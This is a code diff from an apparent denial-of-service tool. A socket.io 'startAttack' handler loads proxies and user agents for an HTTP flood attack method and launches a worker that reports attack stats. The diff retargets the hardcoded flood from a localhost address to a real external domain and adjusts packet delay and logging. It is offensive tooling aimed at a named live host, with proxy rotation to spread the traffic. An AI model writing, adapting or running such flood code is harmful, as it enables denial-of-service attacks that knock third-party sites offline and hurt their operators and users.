@@ -25,11 +25,11 @@ io.on("connection", (socket) => {
 
     socket.on("startAttack", (params) => {
         // const {target, duration, packetDelay, attackMethod, packetSize} = params;
-        const target = 'http://127.0.0.0.1:8000';
+        const target = 'https://shg2.radolyn.com';
         const filteredProxies = filterProxies(loadProxies(), AttackMethod.HTTPFlood);
         const userAgents = loadUserAgents();
         const duration = 1000;
-        const packetDelay = 100;
+        const packetDelay = 1000;
         const packetSize = 64;
 
         socket.emit("stats", {
@@ -48,7 +48,10 @@ io.on("connection", (socket) => {
             },
         });
 
-        worker.on("message", (message) => socket.emit("stats", message));
+        worker.on("message", (message) => {
+            console.log('MESSAGE:', message);
+            socket.emit("stats", message)
+        });
 
         worker.on("error", (error) => {
             console.log(error);
